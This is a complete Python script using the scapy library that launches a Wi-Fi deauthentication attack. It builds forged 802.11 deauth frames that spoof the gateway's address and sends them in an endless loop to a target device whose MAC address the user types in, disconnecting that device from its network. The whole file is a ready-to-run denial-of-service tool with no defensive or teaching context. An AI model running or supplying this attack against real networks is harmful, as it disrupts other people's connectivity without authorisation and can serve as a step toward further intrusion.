from scapy.all import *

def Deauthenticate(TargetMAC, GatewayMAC, iFace):
    Packet = RadioTap() / \
          Dot11(addr1 = TargetMAC, addr2 = GatewayMAC, addr3 = GatewayMAC) / \
          Dot11Deauth(reason = 7)
    
    print(f"Sending Deauth packets to {TargetMAC} from {GatewayMAC}")

    while True:
        sendp(Packet, iface = iFace, count = 100, inter = 0.1, verbose = False)

TargetMAC =  input("Target MAC address             ")
GatewayMAC = input("Gateway/Router MAC address     ")
iFace =      input("Wi-Fi Interface (eg. wlan0)    ")

Deauthenticate(TargetMAC, GatewayMAC, iFace)